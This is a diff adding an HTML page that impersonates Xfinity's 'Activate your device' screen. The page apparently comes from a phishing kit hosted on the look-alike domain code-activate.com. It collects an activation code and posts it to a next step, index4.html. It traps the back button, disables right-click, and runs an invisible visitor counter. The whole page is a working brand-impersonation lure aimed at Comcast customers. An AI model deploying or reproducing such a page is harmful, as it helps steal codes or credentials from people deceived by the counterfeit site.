@@ -1,0 +1,77 @@
+
+<!-- saved from url=(0034)https://xfinity.code-activate.com/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Activate Device">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0">
+    <title>Activate your device</title>
+
+    <link rel="stylesheet" type="text/css" href="./index3_files/styles-dark.min.css">
+    <link rel="stylesheet" type="text/css" href="./index3_files/styles-dark.min(1).css">
+
+<script type="text/javascript">
+history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+        history.go(1);
+    };
+</script>
+</head><body oncontextmenu="return false;">
+        <main class="main-content">
+            <div class="container">
+                <h1 class="xfinity-logo"></h1>
+	<p class="h2">Let's activate your device</p>
+	<p class="h3">Enter your activation code:</p>
+	<form action="index4.html" method="post">
+		<div class="textfield-wrapper">
+			<input type="text" autocorrect="off" autocapitalize="off" spellcheck="false" id="activationPIN" name="activationPIN" placeholder="Enter Code" value="">
+		</div>
+		<button type="submit" class="submit">Continue</button>
+
+		<input type="hidden" name="partnerId" value="comcast">
+	</form>
+	<div class="support">
+		<p class="h3">Not an Xfinity customer?</p>
+	<!--	<a href="https://www.xfinity.com">Learn more about our services</a>-->
+	</div>
+</div>
+<script src="./index3_files/jquery-3.3.1.min.js"></script>
+        	<script>
+		$(document).ready(function() {
+			var validationCode=$('#activationPIN');
+
+			$( "form" ).submit(function( event ) {
+				if(validationCode.val()===""){
+					$("#error").remove();
+					$('<p id="error" class="error_message">Please enter a valid activation code.</p>').insertAfter(".textfield-wrapper");
+					validationCode.attr('aria-invalid','true').addClass('error').focus();
+					return false;
+				}else{
+					return true;
+				}
+				event.preventDefault();
+			});
+
+			$('#activationPIN').on('input paste', function() {
+				if(validationCode.val()===""){
+					$("#error").remove();
+					$('<p id="error" class="error_message">Please enter a valid activation code.</p>').insertAfter(".textfield-wrapper");
+					validationCode.attr('aria-invalid','true').addClass('error');
+				} else {
+					$("#error").remove();
+					validationCode.removeAttr('aria-invalid').removeClass('error');
+				}
+			});
+		})
+	 </script>
+        </main>
+<script type="text/javascript">
+var sc_project=12234385;
+var sc_invisible=1;
+var sc_security="03b80f2f";
+</script>
+<script type="text/javascript" src="./index3_files/counter.js" async=""></script>
+
+
+</body></html>
